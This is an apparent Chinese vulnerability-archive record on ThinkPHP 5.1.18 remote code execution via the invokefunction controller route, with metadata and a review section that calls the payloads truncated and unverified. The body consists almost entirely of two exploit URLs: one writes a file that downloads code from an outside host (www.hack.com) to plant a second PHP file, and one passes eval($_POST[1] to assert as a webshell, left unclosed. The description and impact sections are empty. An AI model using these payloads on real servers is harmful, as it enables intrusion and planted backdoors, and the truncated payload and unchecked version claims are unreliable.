---
source: "hatch 补库批 20260928"
product: "ThinkPHP / 控制器反射"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Thinkphp 5.1.18"
prerequisites: "来源所述条件，未列明部分仍待核：标题5.1.18；缺修复范围与PHP/assert条件"
side_effects: "未执行；本文需注意的操作影响：关键载荷截断；无写入权限分支结尾eval($_POST[1]未闭合；持久写入与外部下载缺说明；第一条创建index11.php并再下载写index_bak2.php，无清理或原始来源"
source_status: "unknown"
id: "vw-e3a81ea9ff340ac83dafd778"
entity_id: "ve-e3a81ea9ff340ac83dafd778"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：标题5.1.18；缺修复范围与PHP/assert条件

代码与实验材料：两个URL，第二个eval($_POST\[1\]缺闭合括号；无结果

来源证据范围：仅hatch标签

- **代码与转录边界（1）**：关键载荷截断；依据：无写入权限分支结尾eval($_POST\[1\]未闭合。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **事实待核（2）**：版本分支未核验；依据：用think/app/invokefunction跨5.1复制，需核验对应类方法，不能凭标题假设可用。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **操作与副作用边界（3）**：持久写入与外部下载缺说明；依据：第一条创建index11.php并再下载写index_bak2.php，无清理或原始来源。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Thinkphp 5.1.18

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 1、常规poc

    http://www.xxxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][0]=index11.php&vars[1][1]=<?=file_put_contents('index_bak2.php',file_get_contents('https://www.hack.com/xxx.js'));?>

### 2、所有目录都无写入权限,base64函数被拦截

     http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=eval($_POST[1]
